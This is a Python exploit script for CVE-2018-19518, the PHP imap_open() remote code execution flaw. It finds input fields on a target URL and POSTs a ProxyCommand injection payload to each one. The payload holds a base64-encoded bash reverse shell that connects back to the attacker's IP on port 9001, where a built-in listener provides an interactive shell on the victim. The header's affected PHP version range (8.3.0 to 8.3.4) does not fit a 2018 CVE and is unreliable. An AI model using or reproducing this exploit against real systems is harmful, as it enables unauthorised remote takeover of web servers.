# CVE-2018-19518
# PHP imap_open() RCE
# version : 8.3.0~8.3.4
# version(reg) : ^8\.3\.(0|1|2|3|4)$

import argparse 
import requests
from bs4 import BeautifulSoup
import base64
import socket, sys, time
from threading import Thread
import os
import subprocess


def nc_listener(timeout=5,  RCE=False):
    attacker_IP = Get_My_IP()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((attacker_IP, 9001))
    server_socket.listen(1)

    # print(f"[+] Waiting for connection on port {9001}...")

    server_socket.settimeout(timeout)

    try:
        # 5초 동안 연결 기다림
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address}")
        print("[+] RCE - Shell connection established!")
        print(f"[*] Detected Vulnerability : True\n")
        print("-------------------------------------")
        
        if RCE:
            while True:
                command = input("Shell> ")
                if command.lower() == "exit":
                    break

                client_socket.send(command.encode() + b'\n')

                response = client_socket.recv(1024)
                print(response.decode())

        
    except socket.timeout:
        print(f"[-] No connection received within {timeout} seconds. Closing server.")
        print(f"[-] Detected Vulnerability : False")
    
    except Exception as e:
        print(f"[-] Error: {e}")
        print(f"[-] Detected Vulnerability : False")
    
    finally:
        server_socket.close()
    


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP=Get_My_IP()


def find_input_form(URL):
    try:
        response = requests.get(URL)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            input_names = [input_tag.get('name') for input_tag in soup.find_all('input') if input_tag.get('name')]

            if len(input_names)>0:
                print(f"[+] input_names : {input_names}\n")
                return input_names
            else:
                print("[-] No input tag found on the webpage")
                return False
        else:
            print("[-] Failed to load the webpage.")
            return False
    except requests.RequestException as e:
        print("[-] Failed to load the webpage.")
        return False


def exploit(URL, NAME, RCE=False):
    
    listener_thread = Thread(target=nc_listener,args=(5, RCE))
    listener_thread.start()
    time.sleep(1)

    attacker_IP = Get_My_IP()

    #PoC
    poc = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{attacker_IP}/9001 0>&1'"
    poc = base64.b64encode(poc.encode()).decode()
    payload = "x -oProxyCommand=echo	{}=|base64	-d|sh}}".format(poc)

    print(f"[+] payload : {payload}")

    for name in NAME:

        body = {name: payload}

        try:
            response = requests.post(url=URL, data=body, verify=False, timeout=5)
        except:
            print(f"[-] Detected Vulnerability : False")
            return False

    

if __name__ == "__main__":
    print('''=====================\n   CVE-2018-19518\n PHP imap_open() RCE\n=====================''')

    parser = argparse.ArgumentParser(usage="python3 CVE-2018-19518.py -u <Target URL> -rce")
    parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080/)')
    parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
    args = parser.parse_args()

    URL=args.URL.rstrip("/")
    
    print("[+] Target URL : "+URL)
    
    input_names=find_input_form(URL)

    if input_names:

        if args.RCE:
            exploit(URL, input_names, RCE=True)
        else:
            exploit(URL, input_names, RCE=False)